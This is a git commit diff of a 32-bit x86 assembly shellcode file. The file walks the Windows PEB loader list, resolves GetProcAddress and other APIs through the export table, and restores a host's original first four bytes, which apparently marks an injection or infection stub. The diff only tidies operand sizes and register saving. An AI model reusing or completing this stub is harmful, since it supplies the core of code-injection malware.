e42d78a8cac42122543e622f81ecaface35442c8
Mustafa Mahmoud <43878201+d35ha@users.noreply.github.com>
2019-07-03 13:20:37 +0200

    Update shell_x32.asm

--- ShellCode/shell_x32.asm
+++ ShellCode/shell_x32.asm
@@ -4,16 +4,16 @@ bits 32
 Init:
     push    TEB_PPEB_OFFSET
     pop     eax
-    fs mov  edx, dword [eax]
-    mov     edx, dword [edx + PEB_PLDR_OFFSET]
-    mov     edx, dword [edx + LDR_PIN_ORDER_MOD_LIST_OFFSET]
+    fs mov  edx, [eax]
+    mov     edx, [edx + PEB_PLDR_OFFSET]
+    mov     edx, [edx + LDR_PIN_ORDER_MOD_LIST_OFFSET]
     mov     esi, edx
     lodsd
     xchg    eax, esi
     lodsd
-    mov     ebp, dword [eax + LDR_MODULE_BASE_OFFSET]
-    mov     eax, dword [ebp + IMAGE_DOS_HEADER_LFANEW_OFFSET]
-    mov     ebx, dword [ebp + eax + IMAGE_NT_HEADER_ENTRY_EXPORT_OFFSET]
+    mov     ebp, [eax + LDR_MODULE_BASE_OFFSET]
+    mov     eax, [ebp + IMAGE_DOS_HEADER_LFANEW_OFFSET]
+    mov     ebx, [ebp + eax + IMAGE_NT_HEADER_ENTRY_EXPORT_OFFSET]
     add     ebx, ebp
     mov     esi, [ebx + EXPORT_TABLE_ADDR_OF_NAMES_OFFSET]
     add     esi, ebp
@@ -37,7 +37,8 @@ FindGetProcAddr:
     mov     edi, [esi + ecx*4]
     add     edi, ebp
     mov     esi, edx
-    mov     ebp, dword [esi + LDR_MODULE_BASE_OFFSET]
+    mov     ebp, [esi + LDR_MODULE_BASE_OFFSET]
+    push    esi
     jmp     GetApisArray
 ApisArray:
     pop     ebx
@@ -47,7 +48,7 @@ ApisArrayLoop:
     je      ApisArrayLoopEnd
 LdrLoop:
     mov     esi, [esi]
-    mov     ecx, dword [esi + LDR_MODULE_BASE_OFFSET]
+    mov     ecx, [esi + LDR_MODULE_BASE_OFFSET]
     test    ecx, ecx
     jz      FatalExit
     push    ebx
@@ -64,10 +65,11 @@ GetThunkLoop:
     mov     edx, [ebx]
     add     edx, ebp
     mov     dword [edx], eax
+    mov     esi, [esp]
     add     ebx, 4h
-LdrLoopEnd:
     jmp     ApisArrayLoop
 ApisArrayLoopEnd:
+    pop     esi
     pop     ebp
     sub     ebp, 5h
     mov     dword [ebp], FIRST_ORIGINAL_FOUR_BYTES
